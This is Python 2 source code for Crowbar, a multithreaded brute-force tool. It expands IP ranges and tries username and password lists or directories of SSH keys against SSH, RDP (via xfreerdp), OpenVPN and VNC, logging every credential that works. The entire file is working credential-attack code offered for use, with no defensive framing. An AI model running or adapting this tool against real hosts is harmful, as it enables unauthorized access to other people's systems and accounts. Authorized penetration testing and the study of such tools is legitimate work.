
try:
	import os
	import re
	import sys
	import shlex
	import signal
	import paramiko
	import argparse
	import tempfile
	import subprocess
	from lib.common import *
	from lib.logger import Logger
	from lib.threadpool import ThreadPool
	from lib.iprange import IpRange,InvalidIPAddress
except ImportError,e:
        import sys
        sys.stdout.write("%s\n" %e)
        sys.exit(1)


class AddressAction(argparse.Action):
  
        def __call__(self, parser, args, values, option = None):

		if args.brute == "sshkey":
			if args.key_file is None:
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -k/--key: expected one argument """
				sys.exit(1)
			elif (args.username is None) and (args.username_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -u/--username or -U/--usernamefile expected one argument """
				sys.exit(1)
			elif (args.server is None) and (args.server_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -s/--server or -S/--serverfile expected one argument """
				sys.exit(1)
			
		elif args.brute == "rdp":	
			if (args.username is None) and (args.username_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -u/--username or -U/--usernamefile expected one argument """
				sys.exit(1)
			elif (args.passwd is None) and (args.passwd_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -c/--passwd or -C/--passwdfile expected one argument """
				sys.exit(1)
			elif (args.server is None) and (args.server_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -s/--server or -S/--serverfile expected one argument """
				sys.exit(1)
		
		elif args.brute == "vnckey": 
			if args.passwd_file is None:
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -C/--passwdfile expected one argument """
				sys.exit(1)
			elif (args.server is None) and (args.server_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -s/--server or -S/--serverfile expected one argument """
				sys.exit(1)	
			
		elif args.brute == "openvpn":
			if args.config is None:
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -m/--config expected one argument """
				sys.exit(1)
			elif (args.server is None) and (args.server_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -s/--server or -S/--serverfile expected one argument """
				sys.exit(1)
			elif (args.username is None) and (args.username_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -u/--username or -U/--usernamefile expected one argument """
				sys.exit(1)
			elif (args.passwd is None) and (args.passwd_file is None):
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -c/--passwd or -C/--passwdfile expected one argument """
				sys.exit(1)
			elif args.key_file is None:
				print >> sys.stderr, """ Usage: use --help for futher information\ncrowbar.py: error: argument -k/--key_file expected one argument """
				sys.exit(1)
		  

			
			
class Main:
		
	def __init__(self):
		
		self.services = {"sshkey":self.sshkey,"rdp":self.rdp, "openvpn":self.openvpn, "vnckey":self.vnckey}
		self.crowbar_readme = "https://github.com/galkan/crowbar/blob/master/README.md"

		self.openvpn_path = "/usr/sbin/openvpn"
		self.vpn_failure = re.compile("SIGTERM\[soft,auth-failure\] received, process exiting")
		self.vpn_success = re.compile("Initialization Sequence Completed")
		self.vpn_remote_regex = re.compile("^\s+remote\s[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\s[0-9]{1,3}")
		self.vpn_warning = "Warning !!! Both \"remote\" options were used at the same time. But command line \"remote\" options will be used !!!"

		self.xfreerdp_path = "/usr/bin/xfreerdp"
		self.rdp_success = "Authentication only, exit status 0"
		self.rdp_display_error = "Please check that the \$DISPLAY environment variable is properly set."	
		
		self.vncviewer_path = "/usr/bin/vncviewer"
		self.vnc_success = "Authentication successful"
	
		description = "Crowbar is a brute force tool which is support sshkey, vnckey, rdp, openvpn."
                usage = "Usage: use --help for futher information"
                parser = argparse.ArgumentParser(description = description, usage = usage)
                parser.add_argument('-b', '--brute', dest = 'brute', help = 'Brute Force Type', choices = self.services.keys(), required = True)
		parser.add_argument('-s', '--server', dest = 'server', action = 'store', help = 'Server Ip Address')
		parser.add_argument('-S', '--serverfile', dest = 'server_file', action = 'store', help = 'Server Ip Address File')
		parser.add_argument('-u', '--username', dest = 'username', action = 'store', help = 'Username')
		parser.add_argument('-U', '--usernamefile', dest = 'username_file', action = 'store', help = 'Username File')
		parser.add_argument('-n', '--number', dest = 'thread', action = 'store', help = 'Thread Number', default = 5, type = int)		
		parser.add_argument('-l', '--log', dest = 'log_file', action = 'store', help = 'Log File', metavar = 'FILE', default = "crowbar.log")				
                parser.add_argument('-o', '--output', dest = 'output', action = 'store', help = 'Output File', metavar = 'FILE', default = "crowbar.out")		
		parser.add_argument('-c', '--passwd', dest = 'passwd', action = 'store', help = 'Password')
		parser.add_argument('-C', '--passwdfile', dest = 'passwd_file', action = 'store', help = 'Password File', metavar = 'FILE')
		parser.add_argument('-t', '--timeout', dest = 'timeout', action = 'store', help = 'Timeout Value', default = 2, type = int)
		parser.add_argument('-p', '--port', dest = 'port', action = 'store', help = 'Service Port Number', type = int)		
		parser.add_argument('-k', '--key', dest = 'key_file', action = 'store', help = 'Key File')
		parser.add_argument('-m', '--config', dest = 'config', action = 'store', help = 'Configuration File')
		
		parser.add_argument('options', nargs = '*', action = AddressAction)

		try:
                	self.args = parser.parse_args()
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)	
	
	
		self.ip_list = []
		iprange = IpRange()
		
		try:
			if self.args.server is not None:
			    for _ in self.args.server.split(","):
				for ip in iprange.iprange(_):
				  self.ip_list.append(ip)
			else:
			    for _ in open(self.args.server_file, "r"):
				for ip in iprange.iprange(_):
				    if not ip in self.ip_list:
					self.ip_list.append(ip)
		except IOError: 
			print >> sys.stderr, "File: %s cannot be opened !!!"% self.args.server_file
			sys.exit(1)
		except:
			print >> sys.stderr, "InvalidIPAddress !!! Please try to use IP/CIDR notation <192.168.37.37/32, 192.168.1.0/24>"
			sys.exit(1)
				
		self.logger = Logger(self.args.log_file, self.args.output)
		self.logger.log_file("START")
		


	def openvpnlogin(self, host, username, password, brute_file, port):

		brute_file_name = brute_file.name
                brute_file.seek(0)

                openvpn_cmd = "%s --config %s --auth-user-pass %s --remote %s %s"% (self.openvpn_path, self.args.config, brute_file_name, host, port)
                proc = subprocess.Popen(shlex.split(openvpn_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)

                brute =  "LOG: OPENVPN: " + host + ":" + username + ":" + password + ":" + brute_file_name
                self.logger.log_file(brute)
                for line in iter(proc.stdout.readline, ''):
                        if re.search(self.vpn_success, line):
                                result = bcolors.OKGREEN + "VPN-SUCCESS: " + bcolors.ENDC + bcolors.OKBLUE + host + "," + username + "," + password + bcolors.ENDC
                                self.logger.output_file(result)
                                os.kill(proc.pid, signal.SIGQUIT)

                brute_file.close()


		
	def openvpn(self):

                port = 443

                if not os.path.exists(self.openvpn_path):
                        print >> sys.stderr, "openvpn: %s path doesn't exists on the system !!!"% (self.openvpn_path)
                        sys.exit(1)

                if self.args.port is not None:
                        port = self.args.port

                
                try:
                        pool = ThreadPool(int(self.args.thread))
                except Exception, err:
                        print >> sys.stderr, err
                        sys.exit(1)

                for config_line in open(self.args.config, "r"):
                        if re.search(self.vpn_remote_regex, config_line):
                                print self.vpn_warning
                                sys.exit(1)

                for ip in self.ip_list:
                        if self.args.username_file:
                                for user in open(self.args.username_file, "r").read().splitlines():
                                        if self.args.passwd_file:
                                                for password in open(self.args.passwd_file, "r").read().splitlines():
                                                        brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                                                        brute_file.write(user + "\n")
                                                        brute_file.write(password + "\n")
                                                        pool.add_task(self.openvpnlogin, ip, user, password, brute_file, port)
                                        else:
                                                brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                                                brute_file.write(user + "\n")
                                                brute_file.write(self.args.passwd + "\n")
                                                pool.add_task(self.openvpnlogin, ip, user, self.args.passwd, brute_file, port)
                        else:
                                if self.args.passwd_file:
                                        for password in open(self.args.passwd_file, "r").read().splitlines():
                                                brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                                                brute_file.write(self.args.username + "\n")
                                                brute_file.write(password + "\n")
                                                pool.add_task(self.openvpnlogin, ip, self.args.username, password, brute_file, port)
                                else:
                                        brute_file = tempfile.NamedTemporaryFile(mode='w+t')
                                        brute_file.write(self.args.username + "\n")
                                        brute_file.write(self.args.passwd + "\n")
                                        pool.add_task(self.openvpnlogin, ip, self.args.username, self.args.passwd, brute_file, port)

                pool.wait_completion()
	
	
	
	def vnclogin(self, ip, port, passwd_file):	

		vnc_cmd = "%s -passwd %s %s:%s"% (self.vncviewer_path, passwd_file, ip, port)
		proc = subprocess.Popen(shlex.split(vnc_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		

		brute =  "LOG: VNC: " + ip + ":" + str(port) + ":" + passwd_file
		self.logger.log_file(brute)
		for line in iter(proc.stderr.readline, ''):
			if re.search(self.vnc_success, line):
				os.kill(proc.pid, signal.SIGQUIT)
				result = bcolors.OKGREEN + "VNC-SUCCESS: " + bcolors.ENDC +  bcolors.OKBLUE + ip + "," + str(port) + "," + passwd_file + bcolors.ENDC
				self.logger.output_file(result)
				break


	def vnckey(self, *options):
		
		port = 5901
		
		if not os.path.exists(self.vncviewer_path):
			print >> sys.stderr, "vncviewer: %s path doesn't exists on the system !!!"% (self.vncviewer_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
				
		if not os.path.isfile(self.args.passwd_file):
			print >> sys.stderr, "Password file doesn't exists !!!"
			sys.exit(1) 				
			
		try:	
			pool = ThreadPool(int(self.args.thread))
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)

		for ip in self.ip_list:
			pool.add_task(self.vnclogin, ip, port, self.args.passwd_file)
					
		pool.wait_completion()

		
		    
	def rdplogin(self, ip, user, password, port):
		
		rdp_cmd = "%s /sec:nla /p:%s /u:%s /port:%s /v:%s +auth-only /cert-ignore"% (self.xfreerdp_path, password, user, port, ip)
		proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		

		brute =  "LOG-RDP: " + ip + ":" + user + ":" + password + ":" + str(port)
		self.logger.log_file(brute)
		for line in iter(proc.stderr.readline, ''):
			if re.search(self.rdp_success, line):
				result = bcolors.OKGREEN + "RDP-SUCCESS : " + bcolors.ENDC + bcolors.OKBLUE + ip + "," + user + "," + password + "," + str(port) + bcolors.ENDC
				self.logger.output_file(result)				
				break
			elif re.search(self.rdp_display_error, line):
				print >> sys.stderr, "Please check \$DISPLAY is properly set. See readme %s"% self.crowbar_readme
				break		
		

	def rdp(self):
		
		port = 3389

		if not os.path.exists(self.xfreerdp_path):
			print >> sys.stderr, "xfreerdp: %s path doesn't exists on the system !!!"% (self.xfreerdp_path)
			sys.exit(1)

		if self.args.port is not None:
			port = self.args.port
		
		
		try:	
			pool = ThreadPool(int(self.args.thread))
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)


		for ip in self.ip_list:
			if self.args.username_file:
				for user in open(self.args.username_file, "r").read().splitlines():
					if self.args.passwd_file:			
						for password in open(self.args.passwd_file, "r").read().splitlines():
							pool.add_task(self.rdplogin, ip, user, password, port)
					else:
						pool.add_task(self.rdplogin, ip, user, self.args.passwd, port)
			else:
				if self.args.passwd_file:
					for password in open(self.args.passwd_file, "r").read().splitlines():
						pool.add_task(self.rdplogin, ip, self.args.username, password, port)
				else:
					pool.add_task(self.rdplogin, ip, self.args.username, self.args.passwd, port)

		pool.wait_completion()		
			


	def sshlogin(self, ip, port, user, keyfile, timeout):	
	
		try:
		    ssh = paramiko.SSHClient()
		    paramiko.util.log_to_file("/dev/null")
		    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		except:
		    pass
		else:
		    brute =  "LOG-SSH : " + ip + ":" + str(port) + ":" + user + ":" + keyfile + ":" + str(timeout)
		    self.logger.log_file(brute)
		  
		    try:
			ssh.connect(ip, port, username = user, password = None, pkey = None, key_filename = keyfile, timeout = timeout, allow_agent = False, look_for_keys = False)
			result = bcolors.OKGREEN + "SUCCESS-SSH : " + bcolors.ENDC + bcolors.OKBLUE + ip + "," + str(port) + "," + user + "," + keyfile + bcolors.ENDC
			self.logger.output_file(result)
		    except:
			pass
			

	def sshkey(self):

		port = 22
				
		if self.args.port is not None:
			port = self.args.port
		
		try:
			pool = ThreadPool(self.args.thread)
		except Exception, err:
			print >> sys.stderr, err
			sys.exit(1)
	
		for ip in self.ip_list:
			if self.args.username_file:
				for user in open(self.args.username_file, "r").read().splitlines():
					if os.path.isdir(self.args.key_file):
						for dirname, dirnames, filenames in os.walk(self.args.key_file):
							for keyfile in filenames:
								keyfile_path = self.args.key_file + "/" + keyfile
								pool.add_task(self.sshlogin, ip, port, user, keyfile_path, self.args.timeout)
					else:
						pool.add_task(self.sshlogin, ip, port, user, self.args.key_file, self.args.timeout)
			else:
				if os.path.isdir(self.args.key_file):
					for dirname, dirnames, filenames in os.walk(self.args.key_file):
						for keyfile in filenames:
							keyfile_path = self.args.key_file + "/" + keyfile						
							pool.add_task(self.sshlogin, ip, port, self.args.username, keyfile_path, self.args.timeout)
				else:
					pool.add_task(self.sshlogin, ip, port, self.args.username, self.args.key_file, self.args.timeout)
			
		pool.wait_completion()

		
		
	def run(self, brute_type):

		signal.signal(signal.SIGINT, self.signal_handler)
		
		if not brute_type in self.services.keys():
			print >> sys.stderr, "%s is not valid service. Please select %s "% (brute_type, self.services.keys())
			sys.exit(1)
		else:
			self.services[brute_type]()
			self.logger.log_file("STOP")


	def signal_handler(self, signal, frame):

        	print('Exit ...')
        	sys.exit(1)	
